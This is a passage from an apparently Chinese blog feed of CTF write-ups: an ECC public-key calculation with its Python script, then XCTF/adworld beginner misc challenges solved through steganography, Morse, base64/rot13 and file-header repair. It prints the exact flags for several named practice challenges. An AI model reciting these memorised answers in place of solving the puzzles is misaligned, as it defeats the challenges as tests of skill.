class="selector-tag">a</span>,b)参数为</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> = <span class="number">15424654874903</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span> = <span class="number">16546484</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">b</span> = <span class="number">4548674875</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">G</span><span class="params">(<span class="number">6478678675</span>,<span class="number">5636379357093</span>)</span></span></span><br><span class="line"></span><br><span class="line">私钥为</span><br><span class="line"></span><br><span class="line">k = <span class="number">546768</span></span><br><span class="line"></span><br><span class="line">求公钥K(x,y)</span><br></pre></td></tr></table></figure><p>又因为题目说工具，了解其算法后，便找到了一个python的脚本计算公钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">EllipticCurve = collections.namedtuple(<span class="string">'EllipticCurve'</span>, <span class="string">'name p a b g n h'</span>)</span><br><span class="line"></span><br><span class="line">curve = EllipticCurve(</span><br><span class="line">   <span class="string">'secp256k1'</span>,</span><br><span class="line">   <span class="comment"># Field characteristic.</span></span><br><span class="line">   p=int(input(<span class="string">'p='</span>)),</span><br><span class="line">   <span class="comment"># Curve coefficients.</span></span><br><span class="line">   a=int(input(<span class="string">'a='</span>)),</span><br><span class="line">   b=int(input(<span class="string">'b='</span>)),</span><br><span class="line">   <span class="comment"># Base point.</span></span><br><span class="line">   g=(int(input(<span class="string">'Gx='</span>)),</span><br><span class="line">      int(input(<span class="string">'Gy='</span>))),</span><br><span class="line">   <span class="comment"># Subgroup order.</span></span><br><span class="line">   n=int(input(<span class="string">'k='</span>)),</span><br><span class="line">   <span class="comment"># Subgroup cofactor.</span></span><br><span class="line">   h=<span class="number">1</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Modular arithmetic ##########################################################</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_mod</span><span class="params">(k, p)</span>:</span></span><br><span class="line">   <span class="string">"""Returns the inverse of k modulo p.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  This function returns the only integer x such that (x * k) % p == 1.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  k must be non-zero and p must be a prime.</span></span><br><span class="line"><span class="string">  """</span></span><br><span class="line">   <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">raise</span> ZeroDivisionError(<span class="string">'division by zero'</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">       <span class="comment"># k ** -1 = p - (-k) ** -1 (mod p)</span></span><br><span class="line">       <span class="keyword">return</span> p - inverse_mod(-k, p)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># Extended Euclidean algorithm.</span></span><br><span class="line">   s, old_s = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">   t, old_t = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">   r, old_r = p, k</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> r != <span class="number">0</span>:</span><br><span class="line">       quotient = old_r // r</span><br><span class="line">       old_r, r = r, old_r - quotient * r</span><br><span class="line">       old_s, s = s, old_s - quotient * s</span><br><span class="line">       old_t, t = t, old_t - quotient * t</span><br><span class="line"></span><br><span class="line">   gcd, x, y = old_r, old_s, old_t</span><br><span class="line"></span><br><span class="line">   <span class="keyword">assert</span> gcd == <span class="number">1</span></span><br><span class="line">   <span class="keyword">assert</span> (k * x) % p == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> x % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Functions that work on curve points #########################################</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_on_curve</span><span class="params">(point)</span>:</span></span><br><span class="line">   <span class="string">"""Returns True if the given point lies on the elliptic curve."""</span></span><br><span class="line">   <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">       <span class="comment"># None represents the point at infinity.</span></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">   x, y = point</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> (y * y - x * x * x - curve.a * x - curve.b) % curve.p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">point_neg</span><span class="params">(point)</span>:</span></span><br><span class="line">   <span class="string">"""Returns -point."""</span></span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(point)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">       <span class="comment"># -0 = 0</span></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">   x, y = point</span><br><span class="line">   result = (x, -y % curve.p)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(result)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">point_add</span><span class="params">(point1, point2)</span>:</span></span><br><span class="line">   <span class="string">"""Returns the result of point1 + point2 according to the group law."""</span></span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(point1)</span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(point2)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> point1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">       <span class="comment"># 0 + point2 = point2</span></span><br><span class="line">       <span class="keyword">return</span> point2</span><br><span class="line">   <span class="keyword">if</span> point2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">       <span class="comment"># point1 + 0 = point1</span></span><br><span class="line">       <span class="keyword">return</span> point1</span><br><span class="line"></span><br><span class="line">   x1, y1 = point1</span><br><span class="line">   x2, y2 = point2</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> x1 == x2 <span class="keyword">and</span> y1 != y2:</span><br><span class="line">       <span class="comment"># point1 + (-point1) = 0</span></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> x1 == x2:</span><br><span class="line">       <span class="comment"># This is the case point1 == point2.</span></span><br><span class="line">       m = (<span class="number">3</span> * x1 * x1 + curve.a) * inverse_mod(<span class="number">2</span> * y1, curve.p)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="comment"># This is the case point1 != point2.</span></span><br><span class="line">       m = (y1 - y2) * inverse_mod(x1 - x2, curve.p)</span><br><span class="line"></span><br><span class="line">   x3 = m * m - x1 - x2</span><br><span class="line">   y3 = y1 + m * (x3 - x1)</span><br><span class="line">   result = (x3 % curve.p,</span><br><span class="line">             -y3 % curve.p)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(result)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scalar_mult</span><span class="params">(k, point)</span>:</span></span><br><span class="line">   <span class="string">"""Returns k * point computed using the double and point_add algorithm."""</span></span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(point)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">       <span class="comment"># k * point = -k * (-point)</span></span><br><span class="line">       <span class="keyword">return</span> scalar_mult(-k, point_neg(point))</span><br><span class="line"></span><br><span class="line">   result = <span class="literal">None</span></span><br><span class="line">   addend = point</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> k:</span><br><span class="line">       <span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">           <span class="comment"># Add.</span></span><br><span class="line">           result = point_add(result, addend)</span><br><span class="line"></span><br><span class="line">       <span class="comment"># Double.</span></span><br><span class="line">       addend = point_add(addend, addend)</span><br><span class="line"></span><br><span class="line">       k &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">assert</span> is_on_curve(result)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Keypair generation and ECDHE ################################################</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_keypair</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="string">"""Generates a random private-public key pair."""</span></span><br><span class="line">   private_key = curve.n</span><br><span class="line">   public_key = scalar_mult(private_key, curve.g)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> private_key, public_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private_key, public_key = make_keypair()</span><br><span class="line">print(<span class="string">"private key:"</span>, hex(private_key))</span><br><span class="line">print(<span class="string">"public key: (0x&#123;:x&#125;, 0x&#123;:x&#125;)"</span>.format(*public_key))</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$python</span> ecc_calKey.py</span><br><span class="line">p=15424654874903</span><br><span class="line">a=16546484</span><br><span class="line">b=4548674875</span><br><span class="line">Gx=6478678675</span><br><span class="line">Gy=5636379357093</span><br><span class="line">k=546768</span><br><span class="line">private key: 0x857d0</span><br><span class="line">public key: (0xcb19fe553fa, 0x50545408eb4)</span><br><span class="line"></span><br><span class="line"><span class="variable">$python</span></span><br><span class="line">&gt;&gt;&gt; 0x50545408eb4+0xcb19fe553fa</span><br><span class="line">19477226185390</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-adworld-misc-wp</title>
      <link href="/2019/11/08/XCTF-adworld-misc-wp/"/>
      <url>/2019/11/08/XCTF-adworld-misc-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc-amp-WriteUp"><a href="#Misc-amp-WriteUp" class="headerlink" title="Misc&amp;WriteUp"></a><center>Misc&amp;WriteUp</center></h1><p>msic永远充满了惊喜</p><h1 id="攻防世界-amp-Misc新手练习区"><a href="#攻防世界-amp-Misc新手练习区" class="headerlink" title="攻防世界&amp;Misc新手练习区"></a><center>攻防世界&amp;Misc新手练习区</center></h1><h2 id="0x01-this-is-flag"><a href="#0x01-this-is-flag" class="headerlink" title="0x01  this_is_flag"></a>0x01  this_is_flag</h2><blockquote><p>题目描述： Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9} </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\1.jpg" alt></p><p>易知flag为：<code>flag{th1s_!s_a_d4m0_4la9}</code></p><h2 id="0x02-ext3"><a href="#0x02-ext3" class="headerlink" title="0x02 ext3"></a>0x02 ext3</h2><blockquote><p>题目描述： 今天是菜狗的生日，他收到了一个linux系统光盘 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\2.jpg" alt></p><p>下载附件得到一个19.5MB的文件，由于题目是ext3，所以联想到将该文件挂载至linux下</p><p>运行<code>mount test /mnt/</code>,然后发现下面有一堆文件</p><p>执行<code>find |grep flag</code>，得到<code>./O7avZhikgKgbF/flag.txt</code></p><p>用<code>cat</code>命令查看文件，得到一串字符<code>ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</code></p><p>明显的base64编码，转码得到flag：<code>flag{sajbcibzskjjcnbhsbvcjbjszcszbkzj}</code></p><hr><p>但是看官方wp，发现是另外一种做法。</p><p>不知道为啥判断附件为img格式，然后用winhex打开该文件搜索flag得到如下</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\2_2.jpg" alt></p><p>然后解压该文件（我用bandzip没有打开，改后缀为img装载显示光盘映像已损坏），搜索得到flag.txt，然后其他步骤相同</p><h2 id="0x03-give-you-flag"><a href="#0x03-give-you-flag" class="headerlink" title="0x03  give_you_flag"></a>0x03  give_you_flag</h2><blockquote><p> 题目描述：菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\3.jpg" alt></p><p>下载附件，发现是一个gif文件，打开查看发现在最后几秒闪过一个二维码</p><p>第一次做傻傻地用了linux下convert命令，将gif转到png，发现50多帧都被拆分成一个个png，</p><p>二维码大概在49帧，后面才发现有Stegsolve可以查看图片的每一帧</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\3_2.jpg" style="zoom:50%;"></p><p>明显是个二维码，修补其三角定位，得到下图</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\3_3.jpg" style="zoom:50%;"></p><p>扫码得到flag：<code>flag{e7d478cf6b915f50ab1277f78502a2c5}</code> </p><h2 id="0x04-pdf"><a href="#0x04-pdf" class="headerlink" title="0x04 pdf"></a>0x04 pdf</h2><blockquote><p> 题目描述：菜猫给了菜狗一张图，说图下面什么都没有 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\4.jpg" style="zoom:50%;"></p><p>打开附件是一个pdf，里面是一张图片，推测将pdf转为word格式之后，移走图片，发现flag就在图片底下</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\4_2.jpg" style="zoom:50%;"></p><p>易知得到flag：<code>flag{security_through_obscurity}</code></p><h2 id="0x05-stegano"><a href="#0x05-stegano" class="headerlink" title="0x05 stegano"></a>0x05 stegano</h2><blockquote><p> 题目描述：菜狗收到了图后很开心，玩起了pdf 提交格式为flag{xxx}，解密字符需小写 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\5.jpg" style="zoom:50%;"></p><p>打开附件发现一份文档</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\5_2.jpg" style="zoom: 25%;"></p><p>一开始没有思路，就先用之前的convert命令，将pdf的东西全部复制出来查看，发现</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\5_3.jpg" alt></p><p>将AB转换为. - 可得到如下</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="string">.-.</span> <span class="params">---</span> -. --. <span class="string">.-.</span> <span class="string">.-</span> - <span class="string">..-</span> <span class="string">.-..</span> <span class="string">.-</span> - <span class="string">..</span> <span class="params">---</span> -. <span class="string">...</span> --<span class="string">..--</span> <span class="string">..-.</span> <span class="string">.-..</span> <span class="string">.-</span> --. <span class="params">---</span><span class="string">...</span> <span class="string">.----</span> -. <span class="string">...-</span> <span class="string">.----</span> <span class="string">.....</span> <span class="string">.----</span> -<span class="string">...</span> <span class="string">.-..</span> <span class="string">...--</span> -- <span class="string">...--</span> <span class="string">.....</span> <span class="string">.....</span> <span class="string">....-</span> --. <span class="string">...--</span></span><br></pre></td></tr></table></figure><p>解摩斯密码得到：<code>CONGRATULATIONSFLAG1NV151BL3M3554G3</code></p><p>flag为：<code>flag{1NV151BL3M3554G3}</code></p><h2 id="0x06-SimpleRAR"><a href="#0x06-SimpleRAR" class="headerlink" title="0x06  SimpleRAR"></a>0x06  SimpleRAR</h2><blockquote><p> 题目描述：菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层) </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\6.jpg" style="zoom:50%;"></p><p>下载完附件，只有一个文件，打开<code>flag.txt</code> ,里面写着<code>flag is not here</code></p><p>打开winhex查看该rar，发现里面还有一个secret.png，然后根据文件头（或者使用rar修复） 将A8 3C 7A 修改为 A8 3C 74 。 </p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\6_3.jpg"></p><p>然后解压得到secret.png，打开是一个空白图片，便想到用winhex查看。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\6_2.jpg" alt></p><p>发现文件头是GIF，将后缀改为.gif，然后用Stegsolve分离出两帧图片，分别是二维码的上下部分，还少定位符，补齐定位符，扫码得到flag：<code>flag：flag{yanji4n_bu_we1shi}</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\6_4.jpg" alt></p><h2 id="0x07-坚持60s"><a href="#0x07-坚持60s" class="headerlink" title="0x07 坚持60s"></a>0x07 坚持60s</h2><blockquote><p> 题目描述：菜狗发现最近菜猫不爱理他，反而迷上了菜鸡 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\7.jpg" style="zoom:50%;"></p><p>下下来是一个jar包，用java运行，发现是一个小游戏，根据题目联想需要坚持60s。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\7_2.jpg" style="zoom:25%;"></p><p>玩了几次之后手残放弃，然后解压缩文件，用winhex打开文件搜索flag，在<code>/cn/bjsxt/plane/PlaneGameFrame.class</code>里找到   <code>flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</code>易知是base64编码，base64decode得到<code>flag{DajiDali_JinwanChiji}</code></p><p>第二种办法，我在找到flag后思考这是misc题也不是逆向题，便觉得这游戏肯定有bug，然后根据常识发现右边和下面的边界可以穿过来躲避障碍，但是完全卡入右边界之后无法返回。</p><p>之后发现到下边只能卡入一半，于是突发思维，将小方块卡入右下角然后留下了一个小角，发现可以成功躲过60s（记得计时，在60s~70s时主动出去死亡即可，然后成功得到flag明文</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\7_4.jpg" style="zoom: 25%;"></p><h2 id="0x08-gif"><a href="#0x08-gif" class="headerlink" title="0x08 gif"></a>0x08 gif</h2><blockquote><p> 题目描述：菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\8.jpg" style="zoom:50%;"></p><p>得到一个zip包，查看里面有103张黑白色的图片，联想到二进制。</p><p>白色图片代表0，黑色图片代表1。</p><p>01100110前八位二进制换算后为 f 证明思路正确。</p><p>01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101</p><p>二进制转字符串得到 flag：<code>flag{FuN_giF}</code></p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\8_2.jpg" style="zoom:50%;"></p><h2 id="0x09-掀桌子"><a href="#0x09-掀桌子" class="headerlink" title="0x09  掀桌子"></a>0x09  掀桌子</h2><blockquote><p> 题目描述：菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻ </p></blockquote><p> 题目只有描述中这一段字符串有信息，推测是十六进制，写python的转换代码</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\9.jpg" alt></p><p> 每两个一组，将16进制转换为10进制，减去128以后输出 ascii。 </p><p>得到<code>Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr</code></p><h2 id="0x0a-如来十三掌"><a href="#0x0a-如来十三掌" class="headerlink" title="0x0a  如来十三掌"></a>0x0a  如来十三掌</h2><blockquote><p> 题目描述：菜狗为了打败菜猫，学了一套如来十三掌。 </p></blockquote><p>下下来附件是一个docx，发现是一段文字，贼像佛教里的文字</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\10_2.jpg" style="zoom: 50%;"></p><p>搜索得到这是一种佛语加密，在网站 <a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://keyfc.net/bbs/tools/tudoucode.aspx</a>  <a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener"><strong>与佛论禅</strong></a>  可以翻译，但是将全文复制到chrome和firefox打开的网站里都解码失败了，后看他的说明，推测应该在复制过程中会将繁体字转换为简体字，这样你复制后的文字已经不是最初的原文了，所以解不出。试验过在MicrosoftEdge中能够成功解码。</p><p> 解完是一串像base64编码的字符<code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code>，但是该字符解码得到是一串乱码，然后发现这个字符串需要先用rot13（与题目“如来十三掌”谐音）转一下，然后再base64解码，得到flag。 </p><h2 id="0x0b-base64stego"><a href="#0x0b-base64stego" class="headerlink" title="0x0b  base64stego"></a>0x0b  base64stego</h2><blockquote><p> 题目描述：菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓 </p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="XCTF-adworld-misc-wp\11.jpg" style="zoom:50%;"></p><p>打开压缩包，压缩包是伪加密的根据ctf-wiki里直接用winhex改一个标志位，或者用winrar修复即可</p><p>是一个<code>stego.txt</code>可以看到很多行的base64编码</p><p>解码出来是在wiki百科上对Steganography的解释</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">Steganography is the art and science of</span><br><span class="line"> writing hidden messages in such a way that no one</span><br><span class="line">, apart from the sender and intended recipient, suspe</span><br><span class="line">cts the existence of the mess</span><br><span class="line">age, a form of security through obscurity. T</span><br><span class="line">he word steganography is of Greek origin and means "concea</span><br><span class="line">led writing" from the Greek words steganos meaning "co</span><br><span class="line">vered or protected", and graphein meaning "to w</span><br><span class="line">rite". The first recorded <span class="keyword">use</span> <span class="keyword">of</span> the term was <span class="keyword">in</span> <span class="number">1499</span> <span class="keyword">by</span> Joh</span><br><span class="line">annes Trithemius <span class="keyword">in</span> his Steganographia, a trea</span><br><span class="line">tise <span class="keyword">on</span> cryptography <span class="keyword">and</span> steganography disg</span><br><span class="line">uised <span class="keyword">as</span> a book <span class="keyword">on</span> magic. Generally, mess</span><br><span class="line">ages will appear <span class="keyword">to</span> be something <span class="keyword">else</span>: images, arti</span><br><span class="line">cles, shopping lists, <span class="keyword">or</span> <span class="keyword">some</span> ot</span><br><span class="line">her covertext <span class="keyword">and</span>, classically, the hidden message may be <span class="keyword">in</span> invi</span><br><span class="line">sible ink <span class="keyword">between</span> the <span class="keyword">visible</span> <span class="keyword">lines</span> <span 